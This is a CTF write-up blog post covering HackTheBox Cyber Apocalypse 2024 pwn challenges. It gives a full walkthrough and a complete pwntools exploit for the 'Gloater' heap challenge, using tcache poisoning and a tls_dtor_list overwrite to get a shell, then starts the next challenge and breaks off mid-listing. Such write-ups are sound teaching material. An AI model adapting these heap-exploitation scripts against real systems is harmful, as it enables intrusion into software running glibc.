# Cyber Apocalypse 2024: Pwn

> **Source:** Originally published at https://chovid99.github.io/posts/cyber-apocalypse-2024-pwn
> **Author:** Original author (personal blog / CTF team archive)
> **Retrieved:** 2026-07-13
> **Word count:** 16377
> **Images:** 0 embedded locally

---

Cyber Apocalypse 2024: Pwn - Chovid99's Blog


        **


## Contents


# Cyber Apocalypse 2024: Pwn


            * Mar 14, 2024 * 11511 words 
                * 55 minutes 


                    Contents
                    *


-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
            HackTheBox - Cyber Apocalypse 2024: Hacker Royale


I have been casually participating in the Cyber Apocalypse CTF 2024. During this time, I managed to solve all the challenges in the **pwn, crypto, blockchain, and hardware categories. In this write-up, I will share my solutions for all the challenges in the **pwn category that I solved. If you are interested in reading the write-up for all the **blockchain & hardware challenges, check out this post. If you are interested in reading the write-up for all the **crypto challenges, check out this post.
I managed to solve all of the pwn, crypto, blockchain, and hardware challenges by myself :)


# Pwn


## Gloater [insane]


            *Description*


            One thing that the overlords at KORP™ know best is the sheer sadistic value of taunting opponents. Throughout The Fray, onlookers can eagerly taunt and deride the contestants, pushing them mentally and breaking their will. By the end of the psychological torture, little of what was once human remains. You have come across a Gloater, one of the devices left around the Arena of The Fray. Gloaters allow you to send sardonic messages to the others, even taking on the shapes of their loved ones as the words cut deep into their psyche. But there’s another well-known effect of such a weapon - the user of the Gloater puts a target on his back, as contestants from all factions swear to destroy the one who uses it.


### Initial Analysis


In this challenge, we were given a binary named `gloater`. The first step involved checking the binary’s mitigation techniques to understand the security measures in place. Keeping these mitigations in mind will be crucial as we proceed.


```
1
2
3
4
5

```


```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```


Next, we began disassembling the binary to explore its key functions.


**main


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-94h] BYREF
  char v5[136]; // [rsp+10h] [rbp-90h] BYREF
  int (**v6)(const char *); // [rsp+98h] [rbp-8h]

  setup(argc, argv, envp);
  v6 = &puts;
  libc_start = (__int64)(&puts - 58438);
  libc_end = (__int64)(&puts + 182202);
  printf("Enter User\nDo not make a mistake, or there will be no safeguard!\n> ");
  read(0, user, 0x10uLL);
  v4 = 0;
  while ( 1 )
  {
    printf(
      "1) Update current user\n"
      "2) Create new taunt\n"
      "3) Remove taunt\n"
      "4) Send all taunts\n"
      "5) Set Super Taunt\n"
      "6) Exit\n"
      "> ");
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        change_user();
        break;
      case 2:
        create_taunt();
        break;
      case 3:
        remove_taunt();
        break;
      case 4:
        send_taunts();
      case 5:
        set_super_taunt(v5);
        break;
      default:
        exit(0);
    }
  }
}

```


During the initial phase, the binary calls a `setup` function. Let’s delve into the `setup` function’s implementation to see what it entails.


**setup


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63

```


```
__int64 (__fastcall *setup())()
{
  __int64 (__fastcall *result)(); // rax

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  alarm(0x7Fu);
  old_malloc_hook = _malloc_hook;
  _malloc_hook = (__int64)my_malloc_hook;
  old_free_hook = _free_hook;
  result = my_free_hook;
  _free_hook = (__int64)my_free_hook;
  return result;
}

void *__fastcall my_malloc_hook(size_t a1)
{
  void *v2; // [rsp+18h] [rbp-8h]

  _malloc_hook = old_malloc_hook;
  _free_hook = old_free_hook;
  v2 = malloc(a1);
  old_malloc_hook = _malloc_hook;
  old_free_hook = _free_hook;
  validate_ptr(v2);
  _malloc_hook = (__int64)my_malloc_hook;
  _free_hook = (__int64)my_free_hook;
  return v2;
}

__int64 (__fastcall *__fastcall my_free_hook(void *a1))()
{
  __int64 (__fastcall *result)(); // rax

  _malloc_hook = old_malloc_hook;
  _free_hook = old_free_hook;
  validate_ptr(a1);
  free(a1);
  old_malloc_hook = _malloc_hook;
  old_free_hook = _free_hook;
  _malloc_hook = (__int64)my_malloc_hook;
  result = my_free_hook;
  _free_hook = (__int64)my_free_hook;
  return result;
}

__int64 __fastcall validate_ptr(unsigned __int64 a1)
{
  __int64 result; // rax

  result = libc_start;
  if ( a1 >= libc_start )
  {
    result = libc_end;
    if ( a1 <= libc_end )
    {
      puts("Did you really think?");
      exit(-1);
    }
  }
  return result;
}

```


Upon examining the `setup` function, it became apparent that the binary substitutes the standard `malloc` and `free` functions with its own hooks. These custom hooks introduce a check to determine if the pointers returned by `malloc` or passed to `free` fall within the `libc` address range. If a pointer is within this range, the operation is reverted, adding a layer of security.


Returning to the `main` function, we noticed it establishes the boundaries for `libc_start` and `libc_end`, setting up the address range for these checks. Furthermore, the binary presents 5 menus for interaction, indicating multiple functionalities or actions we can explore.


Let’s proceed by examining each menu option’s implementation to understand how we can interact with the binary and potentially identify vulnerabilities or exploit paths.


**change_user


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42

```


```
int change_user()
{
  int result; // eax
  char buf[20]; // [rsp+0h] [rbp-20h] BYREF
  int v2; // [rsp+14h] [rbp-Ch]
  int i; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  if ( user_changed )
  {
    puts("You have already changed the User. There is only one life.");
    exit(0);
  }
  puts("Setting the User is a safeguard against getting destroyed");
  printf("New User: ");
  v2 = read(0, buf, 0x10uLL);
  v4 = 1;
  for ( i = 0; i <= 15; ++i )
  {
    if ( buf[i] == 32 )
    {
      v4 = 0;
      break;
    }
  }
  printf("Old User was %s...\n", user);
  if ( v4 )
  {
    strcpy(user, "PLAYER FROM THE FACTIONLESS ");
    strncpy(&dest, buf, v2);
  }
  result = puts("Updated");
  user_changed = 1;
  return result;
}

.bss:0000000000004100 user            dq ?                    ; DATA XREF: main+5F↑o
.bss:0000000000004108 qword_4108      dq ?                    ; DATA XREF: change_user+CF↑w
.bss:0000000000004110 super_taunt_plague dq ?                 ; DATA XREF: change_user+E0↑w
.bss:0000000000004118 dword_4118      dd ?                    ; DATA XREF: change_user+E7↑w
.bss:000000000000411C dest            db ?                    ; DATA XREF: change_user+F1↑w
.bss:0000000000004120                 public taunts

```


Upon reviewing the code, it’s clear that `change_user` can only be invoked once, with its primary function being to replace the `user` with a new name. However, an overflow issue is identified within this function. Specifically, the maximum size of `buf` is designated as `0x10`, while the `dest` size is limited to `0x4`. Writing beyond `0x4` will lead to an overwrite of the `taunts` array, revealing our first bug. Moving on to the next section:


**create_taunt


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36

```


```
int create_taunt()
{
  int result; // eax
  int v1; // eax
  __int64 v2; // rcx
  char buf[1028]; // [rsp+0h] [rbp-410h] BYREF
  int v4; // [rsp+404h] [rbp-Ch]
  void *s; // [rsp+408h] [rbp-8h]

  if ( taunt_count > 7 )
    return puts("Cannot taunt more. You must risk it again.");
  s = malloc(0x28uLL);
  memset(s, 0, 0x28uLL);
  printf("Taunt target: ");
  read(0, s, 0x1FuLL);
  if ( !strcmp((const char *)s, user) )
  {
    puts("DANGER: You entered yourself");
    puts("Bet you're glad you paid attention initially, eh?");
    return puts("Next time, you won't be so lucky.");
  }
  else
  {
    memset(buf, 0, 0x400uLL);
    printf("Taunt: ");
    v4 = read(0, buf, 0x3FFuLL);
    *((_QWORD *)s + 4) = malloc(v4);
    memset(s, 0, 0x10uLL);
    memcpy(*((void **)s + 4), buf, v4);
    v1 = taunt_count++;
    v2 = 8LL * v1;
    result = (int)s;
    *(_QWORD *)((char *)&taunts + v2) = s;
  }
  return result;
}

```


Nothing dubious is observed in this function. In summary, it allows for the addition of a new `taunt` entry through the following steps:


- Verify that `taunt_count <= 7`, indicating that the `create_taunt` function can be executed a maximum of 8 times.

- Allocate a chunk `s` with a size of `0x28`.

- Allocate a new chunk and assign its address to `s+0x20`.

- Populate the new chunk with user input.

- Finally, add the `s` chunk to the `taunts` array.


Proceeding to the subsequent menu:


**remove_taunt


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17

```


```
int remove_taunt()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  void *ptr; // [rsp+8h] [rbp-8h]

  printf("Index: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 >= taunt_count )
    return puts("Invalid Index");
  if ( !taunts[v1] )
    return puts("Taunt already removed");
  ptr = (void *)taunts[v1];
  free(*((void **)ptr + 4));
  free(ptr);
  taunts[v1] = 0LL;
  return puts("Taunt removed");
}

```


This function is quite straightforward, essentially removing a `taunt` from the array.


**set_super_taunt


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22

```


```
int __fastcall set_super_taunt(void *a1)
{
  int result; // eax
  int v2[2]; // [rsp+18h] [rbp-8h] BYREF

  if ( super_taunt_set )
    return puts("Super Taunt already set.");
  printf("Index for Super Taunt: ");
  __isoc99_scanf("%d", v2);
  if ( v2[0] < 0 || v2[0] >= taunt_count )
    return puts("Error: Invalid Index");
  if ( !taunts[v2[0]] )
    return puts("Taunt was removed...");
  super_taunt = taunts[v2[0]];
  printf("Plague to accompany the super taunt: ");
  v2[1] = read(0, a1, 0x88uLL);
  printf("Plague entered: %s\n", (const char *)a1);
  super_taunt_plague = (__int64)a1;
  result = puts("Registered");
  super_taunt_set = 1;
  return result;
}

```


The function receives a pointer named `a1`, fills it with a maximum input of `0x88`, and then prints our input using the `%s` modifier. Similar to `change_user`, this function is restricted to a single invocation. At first glance, a bug may not be apparent, but a `leak` bug exists. Revisiting the pointer passed by the `main` function:


```
1
2
3
4
5
6
7
8
9

```


```
  char v5[136]; // [rsp+10h] [rbp-90h] BYREF
  int (**v6)(const char *); // [rsp+98h] [rbp-8h]

  setup(argc, argv, envp);
  v6 = &puts;
...
      case 5:
        set_super_taunt(v5);
        break;

```


`v5` is positioned immediately before `v6`, with `v6` housing the `puts` address. It’s noted that the `super_set_taunt` function permits the complete filling of `v5` (excluding a null byte). Thus, if we populate `v5` to its maximum size (`0x88`), when the function outputs our input with the `%s` modifier, it will reveal the value of `v6` as well (which corresponds to `puts`). This results in a `libc` leak.


Additionally, it is noteworthy that according to the provided `Dockerfile`, the version of libc utilized is `libc-2.31.so`, indicating the absence of mangled pointers in the `heap` freelist.


Having analyzed all crucial functions, we can proceed with crafting the solution.


### Solution


In summary, we’ve identified two critical vulnerabilities:


- The `super_set_taunt` function enables us to leak a `libc` address.

- The `change_user` function suffers from overflow issues, allowing for partial overwriting of the `taunts` array entries.


First, let’s establish our helper functions to simplify the process.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61

```


```
from pwn import *

exe = ELF("gloater_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "94.237.54.48"
remote_port = 47636
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)
    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

def change_user(new_user):
    menu(1)
    sa(b': ', new_user)

def create(target, taunt):
    menu(2)
    sa(b': ', target)
    sa(b': ', taunt)

def delete(idx):
    menu(3)
    sla(b': ', sn(idx))

def set_super_taunts(idx, val):
    menu(5)
    sla(b': ', sn(idx))
    sa(b': ', val)
    r.recvuntil(b': ')
    return r.recvline().strip()

# Before getting to the menu, we need to put initial name
name = b'test'
sa(b'> ', name)

```


Given that we can easily obtain a `libc` leak, our next step involves leveraging the second vulnerability (overwriting the `taunts` array) to achieve code execution.


Firstly, note that the program allows us to exit. There are known methods that exploit how glibc manages the `exit` process to execute code, suggesting we can adopt one of these methods here. I have chosen to utilize the `tls-dtor` method (More details on this method can be found here).


To exploit the `tls-dtor`, we must allocate a chunk within the `tls` area (given the `tls` area’s constant offset from the `libc` address, we can calculate the exact target address), and then write to the `tls` area.


To allocate a chunk in the `tls` area, one strategy involves poisoning the `tcache` freelist. Therefore, our focus shifts to how we can manipulate the `tcache` freelist.


The approach that I’ve selected for this challenge involves creating a fake chunk and aiming to free this fake chunk. To accomplish this, we exploit the `change_user` bug by modifying the least significant byte of the first element in the `taunts` array to point to our `fake_chunk`. Subsequently, invoking `remove_taunt` will free this `fake_chunk`.


For a clearer understanding, refer to the following code and examine the heap layout.


```
1
2
3
4
5
6

```


```
payload = p64(0)+p64(0x71)
payload = payload.ljust(0x30, b'a')
create(b'a'*8, payload)
payload = p64(0)+p64(0xd1)
create(b'a'*8, payload.ljust(0xd0, b'a'))
create(b'b'*8, b'b'*0xd0)

```


Executing the provided code results in the following heap layout:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43

```


```
0x55555555b290: 0x0000000000000000      0x0000000000000031
0x55555555b2a0: 0x0000000000000000      0x0000000000000000
0x55555555b2b0: 0x0000000000000000      0x0000000000000000
0x55555555b2c0: 0x000055555555b2d0      0x0000000000000041
0x55555555b2d0: 0x0000000000000000      0x0000000000000071 <- Our fake chunk
0x55555555b2e0: 0x6161616161616161      0x6161616161616161
0x55555555b2f0: 0x6161616161616161      0x6161616161616161
0x55555555b300: 0x0000000000000000      0x0000000000000031
0x55555555b310: 0x0000000000000000      0x0000000000000000
0x55555555b320: 0x0000000000000000      0x0000000000000000
0x55555555b330: 0x000055555555b340      0x00000000000000e1
0x55555555b340: 0x0000000000000000      0x00000000000000d1
0x55555555b350: 0x6161616161616161      0x6161616161616161
0x55555555b360: 0x6161616161616161      0x6161616161616161
0x55555555b370: 0x6161616161616161      0x6161616161616161
0x55555555b380: 0x6161616161616161      0x6161616161616161
0x55555555b390: 0x6161616161616161      0x6161616161616161
0x55555555b3a0: 0x6161616161616161      0x6161616161616161
0x55555555b3b0: 0x6161616161616161      0x6161616161616161
0x55555555b3c0: 0x6161616161616161      0x6161616161616161
0x55555555b3d0: 0x6161616161616161      0x6161616161616161
0x55555555b3e0: 0x6161616161616161      0x6161616161616161
0x55555555b3f0: 0x6161616161616161      0x6161616161616161
0x55555555b400: 0x6161616161616161      0x6161616161616161
0x55555555b410: 0x0000000000000000      0x0000000000000031
0x55555555b420: 0x0000000000000000      0x0000000000000000
0x55555555b430: 0x0000000000000000      0x0000000000000000
0x55555555b440: 0x000055555555b450      0x00000000000000e1
0x55555555b450: 0x6262626262626262      0x6262626262626262
0x55555555b460: 0x6262626262626262      0x6262626262626262
0x55555555b470: 0x6262626262626262      0x6262626262626262
0x55555555b480: 0x6262626262626262      0x6262626262626262
0x55555555b490: 0x6262626262626262      0x6262626262626262
0x55555555b4a0: 0x6262626262626262      0x6262626262626262
0x55555555b4b0: 0x6262626262626262      0x6262626262626262
0x55555555b4c0: 0x6262626262626262      0x6262626262626262
0x55555555b4d0: 0x6262626262626262      0x6262626262626262
0x55555555b4e0: 0x6262626262626262      0x6262626262626262
0x55555555b4f0: 0x6262626262626262      0x6262626262626262
0x55555555b500: 0x6262626262626262      0x6262626262626262
0x55555555b510: 0x6262626262626262      0x6262626262626262
0x55555555b520: 0x0000000000000000      0x0000000000020ae1
0x55555555b530: 0x0000000000000000      0x0000000000000000

```


The code creates 3 chunks with the aim of freeing our fake_chunk, which has a size of `0x70` and is located at `0x55555555b2d0`. The size is deliberately set to `0x70` as we plan to overwrite the pointer stored in the `0xe1` chunk later on.


Furthermore, to avoid any `free` glibc errors when freeing this chunk, the first `10` bytes of the third chunk are initialized to `0x0000000000000000 0x00000000000000d1`. This setup deceives the `free` glibc function into believing that the subsequent chunk after our fake chunk points to a legitimate chunk, specifically the artificially created `0xd1` chunk.


Before progressing further, we’ll first leak the `libc` address using the `set_super_taunts` function. To do this, simply transmit `b'a'*0x88` as our super taunt payload, and the function will output our taunt along with the `puts` address.


```
1
2
3
4

```


```
# Leak libc
out = set_super_taunts(0, b'a'*0x88)
libc.address = u64(out[-6:].ljust(8, b'\x00')) - libc.sym.puts
logleak('libc.address', libc.address)

```


Returning to the heap layout, note that our fake chunk overlaps with the `0x31` chunk. Utilizing the `change_user` vulnerability, we adjust `taunts[0]` to point to our fake chunk.


```
1
2

```


```
# Overwrite taunts[0] LSB
change_user(b'a'*4+b'\xe0')

```


As a result of this partial overwrite, `taunts[0]` now references our fake chunk located at `0x55555555b2e0`. The next step involves freeing all active `taunts` to examine the heap layout changes.


```
1
2
3
4
5
6

```


```
# Free
delete(2)
delete(1)

# Free fake_chunk
delete(0)

```


After executing the above actions, the heap layout is as follows:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52

```


```
0x55555555b290: 0x0000000000000000      0x0000000000000031
0x55555555b2a0: 0x0000000000000000      0x0000000000000000
0x55555555b2b0: 0x0000000000000000      0x0000000000000000
0x55555555b2c0: 0x000055555555b2d0      0x0000000000000041
0x55555555b2d0: 0x0000000000000000      0x0000000000000071
0x55555555b2e0: 0x0000000000000000      0x000055555555b010
0x55555555b2f0: 0x6161616161616161      0x6161616161616161
0x55555555b300: 0x0000000000000000      0x0000000000000031
0x55555555b310: 0x000055555555b420      0x000055555555b010
0x55555555b320: 0x0000000000000000      0x0000000000000000
0x55555555b330: 0x000055555555b340      0x00000000000000e1
0x55555555b340: 0x000055555555b450      0x000055555555b010
0x55555555b350: 0x6161616161616161      0x6161616161616161
0x55555555b360: 0x6161616161616161      0x6161616161616161
0x55555555b370: 0x6161616161616161      0x6161616161616161
0x55555555b380: 0x6161616161616161      0x6161616161616161
0x55555555b390: 0x6161616161616161      0x6161616161616161
0x55555555b3a0: 0x6161616161616161      0x6161616161616161
0x55555555b3b0: 0x6161616161616161      0x6161616161616161
0x55555555b3c0: 0x6161616161616161      0x6161616161616161
0x55555555b3d0: 0x6161616161616161      0x6161616161616161
0x55555555b3e0: 0x6161616161616161      0x6161616161616161
0x55555555b3f0: 0x6161616161616161      0x6161616161616161
0x55555555b400: 0x6161616161616161      0x6161616161616161
0x55555555b410: 0x0000000000000000      0x0000000000000031
0x55555555b420: 0x0000000000000000      0x000055555555b010
0x55555555b430: 0x0000000000000000      0x0000000000000000
0x55555555b440: 0x000055555555b450      0x00000000000000e1
0x55555555b450: 0x0000000000000000      0x000055555555b010
0x55555555b460: 0x6262626262626262      0x6262626262626262
0x55555555b470: 0x6262626262626262      0x6262626262626262
0x55555555b480: 0x6262626262626262      0x6262626262626262
0x55555555b490: 0x6262626262626262      0x6262626262626262
0x55555555b4a0: 0x6262626262626262      0x6262626262626262
0x55555555b4b0: 0x6262626262626262      0x6262626262626262
0x55555555b4c0: 0x6262626262626262      0x6262626262626262
0x55555555b4d0: 0x6262626262626262      0x6262626262626262
0x55555555b4e0: 0x6262626262626262      0x6262626262626262
0x55555555b4f0: 0x6262626262626262      0x6262626262626262
0x55555555b500: 0x6262626262626262      0x6262626262626262
0x55555555b510: 0x6262626262626262      0x6262626262626262
0x55555555b520: 0x0000000000000000      0x0000000000020ae1
0x55555555b530: 0x0000000000000000      0x0000000000000000
----------------------------------------------------------
tcachebins[idx=1, size=0x30, @0x55555555b098] count=2
 -> Chunk(addr = 0x55555555b300 , size=0x30, flags=PREV_INUSE, fd=0x55555555b420)
 -> Chunk(addr = 0x55555555b410 , size=0x30, flags=PREV_INUSE, fd=0x000000000000)
tcachebins[idx=5, size=0x70, @0x55555555b0b8] count=1
 -> Chunk(addr = 0x55555555b2d0 , size=0x70, flags=PREV_INUSE, fd=0x000000000000)
tcachebins[idx=12, size=0xe0, @0x55555555b0f0] count=2
 -> Chunk(addr = 0x55555555b330 , size=0xe0, flags=PREV_INUSE, fd=0x55555555b450)
 -> Chunk(addr = 0x55555555b440 , size=0xe0, flags=PREV_INUSE, fd=0x000000000000)

```


It’s observed that our `tcachebins` entry for `0x70`—resulting from freeing our `fake_chunk`—intersects with the stored `tcache` pointer for `tcache[0xe0]`’s first entry. Initiating `malloc(0x68)` causes the last `8 bytes` written to the allocated chunk to overlap and subsequently overwrite the `tcache[0xe0]` free pointer.


To exploit this, we create a new `taunt`, carefully setting its last `8 bytes` to the address of the `tls_dtor_list`.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15

```


```
# Overwrite tcache[0xe0] ptr
tls_base = libc.address+0x1f3540
tls_dtor_list = tls_base-0x58
logleak('tls_base', tls_base)
logleak('tls_dtor_list', tls_dtor_list)
payload = flat([
    0x0, 0x0,
    0x61, 0x61,
    0x0, 0x31,
    0x0, 0x0,
    0x0, 0x0,
    0x0, 0xe1,
    tls_dtor_list
])
create(b'a'*8, payload)

```


A deeper look through `gdb` reveals that the `tls_base` is positioned at `libc.address+0x1f3540`. Further examination of the `__GI__call_tls_dtors` function indicates the `tls_dtor_list` is located at `tls_base-0x58`.


```
1
2
3
4
5
6
7
8
9

```


```
gef> disas __call_tls_dtors
Dump of assembler code for function __GI___call_tls_dtors:
   0x00007ffff7e1c280 <+0>:     endbr64
   0x00007ffff7e1c284 <+4>:     push   rbp
   0x00007ffff7e1c285 <+5>:     push   rbx
   0x00007ffff7e1c286 <+6>:     sub    rsp,0x8
   0x00007ffff7e1c28a <+10>:    mov    rbx,QWORD PTR [rip+0x1a4acf]        # 0x7ffff7fc0d60
gef> p/d *0x7ffff7fc0d60
$6 = -88

```


The objective is to allocate a chunk at the `tls_dtor_list` address. Following the execution of the stated procedure, we review the new `tcache` freelist.


```
1
2
3
4
5

```


```
tcachebins[idx=1, size=0x30, @0x55555555b098] count=1
 -> Chunk(addr = 0x55555555b410 , size=0x30, flags=PREV_INUSE, fd=0x000000000000)
tcachebins[idx=12, size=0xe0, @0x55555555b0f0] count=2
 -> Chunk(addr = 0x55555555b330 , size=0xe0, flags=PREV_INUSE, fd=0x7ffff7fc84e8)
 -> Chunk(addr = 0x7ffff7fc84d8 , size=0x0, flags=, fd=0x000000000000)

```


This action successfully redirects the `tcache` of `0xe0` to point towards the `tls_dtor_list`.


Now, we can proceed with the usual `tls-dtors` trick. What we need to do:


- Setting `PTR_MANGLE` to zero for ease in crafting our fake `dtor_list`, located at `tls_dtor_list+0x88`.

- Constructing a fake `dtor_list` at `tls_dtor_list+0x8` to facilitate the placement of `tls_dtor_list+0x8` in the `tls_dtor_list` address.

- Populating the fake `dtor_list` by:


- Assigning `dtor_list->func` to `libc.sym.system << 17`.

- Designating `dtor_list->obj` to the address of `/bin/sh`, which serves as the first argument when invoking `dtor_list->func()`.


Below is the code to prepare the above payload:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13

```


```
# Write tls_dtor_list
create(b'a'*8, b'\x00'*0xd0) # Use the first entry

# Next allocation will be placed in the `tls_area`
payload = flat([
    tls_dtor_list+0x8, # Overwrite tls_dtor_list to tls_dtor_list+8
    libc.sym.system << 17, # This is our fake dtor_list. Set dtor_list->func to system
    next(libc.search(b'/bin/sh\x00')), # Set dtor_list->obj to /bin/sh
])
# ljust(0xd0, b'\x00') eventually will overwrite
# the PTR_MANGLE with zero as well, because PTR_MANGLE 
# is located below `tls_dtor_list+0xd0`.
create(b'a'*8, payload.ljust(0xd0, b'\x00'))

```


Now that we have successfully overwritten the tls_dtor_list, we can simply trigger `exit` by putting invalid `menu`.


```
1
2
3

```


```
# Exit and profit :)
menu(6)
r.interactive()

```


Below is the full code:


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117

```


```
from pwn import *

exe = ELF("gloater_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
context.terminal = ['wezterm', 'cli', 'split-pane', '--top', '--percent', '65']
warnings.simplefilter("ignore")

remote_url = "94.237.56.46"
remote_port = 42849
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)
    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

def change_user(new_user):
    menu(1)
    sa(b': ', new_user)

def create(target, taunt):
    menu(2)
    sa(b': ', target)
    sa(b': ', taunt)

def delete(idx):
    menu(3)
    sla(b': ', sn(idx))

def set_super_taunts(idx, val):
    menu(5)
    sla(b': ', sn(idx))
    sa(b': ', val)
    r.recvuntil(b': ')
    return r.recvline().strip()

name = b'test'
sa(b'> ', name)

payload = p64(0)+p64(0x71)
payload = payload.ljust(0x30, b'a')
create(b'a'*8, payload)
payload = p64(0)+p64(0xd1)
create(b'a'*8, payload.ljust(0xd0, b'a'))
create(b'b'*8, b'b'*0xd0)

# Leak libc
out = set_super_taunts(0, b'a'*0x88)
libc.address = u64(out[-6:].ljust(8, b'\x00')) - libc.sym.puts
logleak('libc.address', libc.address)

# Overwrite taunts[0] LSB
change_user(b'a'*4+b'\xe0')

# Free
delete(2)
delete(1)

# Free fake_chunk
delete(0)

# Overwrite tcache[0xe0] ptr
tls_base = libc.address+0x1f3540
tls_dtor_list = tls_base-0x58
logleak('tls_base', tls_base)
logleak('tls_dtor_list', tls_dtor_list)
payload = flat([
    0x0, 0x0,
    0x61, 0x61,
    0x0, 0x31,
    0x0, 0x0,
    0x0, 0x0,
    0x0, 0xe1,
    tls_dtor_list
])
create(b'a'*8, payload)

# Write tls_dtor_list
create(b'a'*8, b'\x00'*0xd0) # Use the first entry

# Next allocation will be placed in the `tls_area`
payload = flat([
    tls_dtor_list+0x8, # Overwrite tls_dtor_list to tls_dtor_list+8
    libc.sym.system << 17, # This is our fake dtor_list. Set dtor_list->func to system
    next(libc.search(b'/bin/sh\x00')), # Set dtor_list->obj to /bin/sh
])
# ljust(0xd0, b'\x00') eventually will overwrite
# the PTR_MANGLE with zero as well, because PTR_MANGLE 
# is located below `tls_dtor_list+0xd0`.
create(b'a'*8, payload.ljust(0xd0, b'\x00'))

# Exit and profit :)
menu(6)
r.interactive()

```


Executing the above code will give us a shell :)


```
1
2
3
4
5
6
7
8

```


```
╰─❯ python solve.py
[+] Opening connection to 94.237.56.46 on port 42849: Done
[*] libc.address = 0x7f31ee8a8000
[*] tls_base = 0x7f31eea9b540
[*] tls_dtor_list = 0x7f31eea9b4e8
[*] Switching to interactive mode
$ cat flag.txt
HTB{gL0aT_aLl_y0u_l1k3,c0mb4t_cHoOsES_tH3_viCt0rS}

```


>


**Flag: HTB{gL0aT_aLl_y0u_l1k3,c0mb4t_cHoOsES_tH3_viCt0rS}


## Maze of Mist [hard]


            *Description*


            As you stride into your next battle, an enveloping mist surrounds you, gradually robbing you of eyesight. Though you can move, the path ahead seems nonexistent, leaving you stationary within the confines of your existence. Can you discover an escape from this boundless stagnation?


### Initial Analysis


In this challenge, we’re provided with a `zip` file containing a `qemu` setup to execute the target binary, named `target`, located within `initramfs.cpio.gz`. To extract `initramfs.cpio.gz`, follow these steps:


```
1
2
3
4

```


```
gunzip initramfs.cpio.gz
mkdir tmp-root
cd tmp-root
cpio -idv < ../initramfs.cpio

```


Now, let’s try to disasemble the `target` binary. It is a `32-bit` binary.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29

```


```
; Attributes: noreturn

public _start
_start proc near
mov     eax, 4
mov     ebx, 1          ; fd
